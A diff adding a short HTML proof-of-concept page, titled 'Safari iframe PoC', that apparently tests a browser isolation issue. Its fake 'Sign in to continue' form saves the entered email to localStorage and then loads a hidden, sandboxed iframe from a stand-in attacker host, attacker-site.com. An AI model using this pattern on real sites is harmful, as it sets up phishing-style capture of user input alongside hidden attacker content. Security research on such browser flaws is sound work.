@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head><title>Safari iframe PoC</title></head>
+<body>
+  <h3>Sign in to continue</h3>
+  <input type="email" id="emailInput" placeholder="Enter your email" />
+  <button onclick="proceed()">Login</button>
+
+  <script>
+    function proceed() {
+      const email = document.getElementById("emailInput").value;
+      localStorage.setItem("iframe_safari_poc", email);
+
+      // Load sandboxed iframe (attacker-controlled)
+      const iframe = document.createElement("iframe");
+      iframe.src = "https://attacker-site.com/frame.html";
+      iframe.sandbox = "allow-scripts allow-forms";  // ⚠️ intentionally restricted
+      iframe.style.display = "none";
+      document.body.appendChild(iframe);
+    }
+  </script>
+</body>
+</html>
